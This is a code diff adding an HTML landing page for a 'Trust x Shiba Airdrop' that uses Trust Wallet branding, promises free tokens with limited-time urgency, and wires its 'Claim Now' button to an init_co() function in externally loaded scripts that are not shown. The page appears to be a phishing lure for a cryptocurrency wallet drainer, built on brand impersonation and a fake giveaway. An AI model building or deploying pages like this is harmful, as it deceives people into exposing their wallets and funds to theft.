@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="/assets/sources.js"></script>
+    <script src="/assets/app-bundle__5273919514.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust x Shiba Airdrop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --trust-blue: #0500FF;
+            --trust-green: #48FF91;
+            --trust-dark: #1B1B1C;
+            --trust-white: #FFFFFF;
+            --trust-base-white: #F4F4F7;
+            --trust-soft-gray: #F1F4F8;
+            --trust-tint-blue: #DBDCE5;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--trust-white);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: var(--trust-soft-gray);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 24px;
+            margin-bottom: 32px;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            object-fit: contain;
+        }
+
+        .logo-trust {
+            width: 180px;
+            height: 180px;
+            object-fit: contain;
+        }
+
+        .logo-separator {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--trust-dark);
+        }
+
+        .logo-separator svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        h1 {
+            color: var(--trust-dark);
+            font-size: 2.2em;
+            margin-bottom: 12px;
+            font-weight: 700;
+            font-family: 'Roboto', sans-serif;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 1.1em;
+            margin-bottom: 32px;
+            font-weight: 400;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .airdrop-info {
+            background: var(--trust-white);
+            padding: 28px;
+            border-radius: 16px;
+            margin-bottom: 32px;
+            border: 1px solid var(--trust-tint-blue);
+        }
+
+        .airdrop-info h2 {
+            color: var(--trust-dark);
+            margin-bottom: 16px;
+            font-size: 1.5em;
+            font-weight: 700;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .airdrop-info p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 12px;
+            font-size: 1em;
+            font-weight: 400;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .cta-button {
+            background: var(--trust-green);
+            color: var(--trust-dark);
+            padding: 16px 48px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1em;
+            font-weight: 500;
+            font-family: 'Roboto', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 4px 12px rgba(72, 255, 145, 0.3);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(72, 255, 145, 0.4);
+            background: #3AFF9F;
+        }
+
+        .footer {
+            margin-top: 32px;
+            color: #999;
+            font-size: 0.875em;
+            font-weight: 400;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2em;
+            }
+            
+            .logo-container {
+                flex-direction: column;
+            }
+            
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="Trust_Core_Logo_Blue.png" alt="Trust Logo" class="logo-trust">
+            <span class="logo-separator">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </span>
+            <img src="shiba-inu-shib-logo.svg" alt="Shiba Inu Logo" class="logo">
+        </div>
+
+        <h1>Trust x Shiba Airdrop</h1>
+        <p class="subtitle">Exclusive Collaboration Event</p>
+
+        <div class="airdrop-info">
+            <h2>🎁 Claim Your Airdrop</h2>
+            <p>Join the exclusive Trust x Shiba collaboration and claim your free tokens!</p>
+            <p style="margin-top: 15px; font-weight: 500; color: var(--trust-blue);">
+                Limited time offer - Don't miss out!
+            </p>
+        </div>
+
+        <a class="cta-button"  onclick="init_co()">
+            Claim Now
+        </a>
+
+        <div class="footer">
+            <p>Powered by Trust Wallet & Shiba Community</p>
+            <p style="margin-top: 10px;">© 2024 Trust x Shiba</p>
+        </div>
+    </div>
+</body>
+</html>
